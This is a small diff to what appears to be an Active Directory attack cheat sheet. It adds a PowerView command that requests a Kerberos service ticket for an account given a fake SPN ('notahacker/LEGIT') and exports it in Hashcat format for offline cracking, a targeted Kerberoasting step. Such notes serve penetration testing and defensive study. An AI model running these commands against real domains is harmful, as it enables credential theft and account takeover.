@@ -312,6 +312,9 @@ Set-DomainObject -Credential $Cred2 -Identity <USER-3> -SET @{serviceprincipalna
 # confirm the spn added 
 get-domainuser -Identity <USER-3>
 serviceprincipalname   : notahacker/LEGIT
+
+# get the spn ticket 
+ get-domainuser -Identity <USER>  | get-domainspnticket -Format Hashcat
 ```
 ###### Kerberoasting with Rubeus
 ```powershell
